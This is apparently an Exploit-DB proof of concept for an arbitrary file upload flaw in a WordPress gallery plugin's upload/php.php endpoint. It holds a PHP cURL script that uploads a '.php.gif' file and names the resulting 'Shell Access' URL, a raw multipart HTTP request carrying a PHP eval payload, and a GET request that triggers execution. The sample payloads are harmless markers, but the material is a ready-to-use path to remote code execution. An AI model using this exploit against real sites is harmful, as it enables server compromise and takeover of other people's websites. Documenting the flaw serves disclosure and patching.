[PoC exploitdb]

	PostShell.php
	<?php
	 
		$uploadfile="lo.php.gif";
		$ch = 
		curl_init("http://www.exemple.com/wordpress/wp-content/plugins/gallery-plugin/upload/php.php");
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS,
		         array('qqfile'=>"@$uploadfile"));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$postResult = curl_exec($ch);
		curl_close($ch);
		print "$postResult";
	 
	?>
	 
	Shell Access :
	http://www.exemple.com/wordpress/wp-content/plugins/gallery-plugin/upload/files/lo.php.gif
	 
	 
	lo.php.gif
	<?php
	phpinfo();
	?>


[HTTP REQUEST]
	POST /{TARGET}/wp-content/plugins/gallery-plugin/upload/php.php HTTP/1.1
	Host: {TARGET}
	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Content-Type: multipart/form-data; boundary=---------------------------13601166946474
	Content-Length: 257
	Connection: close
	Upgrade-Insecure-Requests: 1

	-----------------------------13601166946474
	Content-Disposition: form-data; name="qqfile"; filename="error.php.gif"
	Content-Type: application/octet-stream

	<?php
		@eval("echo 'XLXX';");
		
	-----------------------------13601166946474--




[HTTP REQUEST TRIGGER]
	GET /{TARGET}/wp-content/plugins/gallery-plugin/upload/files/error.php.gif HTTP/1.1
	Host: {TARGET}
	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Connection: close
	Upgrade-Insecure-Requests: 1

